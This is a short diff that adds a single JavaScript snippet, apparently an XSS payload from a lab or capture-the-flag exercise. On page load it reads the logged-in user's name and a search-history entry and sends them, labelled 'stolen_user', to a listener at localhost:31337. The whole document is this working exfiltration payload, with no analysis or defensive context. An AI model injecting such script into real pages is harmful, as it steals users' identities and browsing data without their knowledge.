@@ -1,0 +1,9 @@
+<script>
+	function test(){
+		var name = $('#logged-in-user').text();
+		var last_search = $('a.history-item.list-group-item:eq(1)').text();
+		var url = 'http://localhost:31337/?stolen_user=' + name + '&last_search=' + last_search;
+		$.get(url);
+	}
+	window.onload = test;
+</script>
